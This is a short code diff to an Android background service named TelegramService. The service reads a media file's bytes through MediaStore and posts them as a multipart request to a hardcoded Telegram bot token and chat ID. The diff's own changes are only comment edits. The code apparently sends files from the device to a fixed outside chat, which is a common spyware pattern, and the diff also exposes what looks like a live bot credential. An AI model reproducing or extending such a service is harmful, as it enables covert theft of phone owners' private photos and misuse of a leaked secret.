@@ -6,7 +6,7 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.IBinder;
 import android.provider.MediaStore;
-import android.support.annotation.Nullable;
+import android.support.annotation.Nullable; // <-- Changed from androidx
 import android.util.Log;
 import java.io.InputStream;
 import java.io.ByteArrayOutputStream;
@@ -21,7 +21,7 @@ import okhttp3.RequestBody;
 import okhttp3.Response;
 
 public class TelegramService extends Service {
-    private static final String BOT_TOKEN = "8499635786:AAGCHlz3SAAhgJXg4-b8aPFisIFlT68K-hY";
+    private static final String BOT_TOKEN = "8499635786:AAGCHlz3SAAhgJXg4-b8aPFisIFlT68K-hY"; // replace with yours
     private static final String CHAT_ID = "1949815322";
 
     @Override
@@ -75,9 +75,9 @@ public class TelegramService extends Service {
             if (in == null) return false;
             byte[] bytes = readBytes(in);
             in.close();
-
+            
             OkHttpClient client = new OkHttpClient();
-            // NOTE: okhttp 3.x uses (MediaType, byte[]) — reversed from 4.x
+            // OkHttp 3.x requires (MediaType, byte[]) order, NOT (byte[], MediaType)
             RequestBody body = new MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", CHAT_ID)
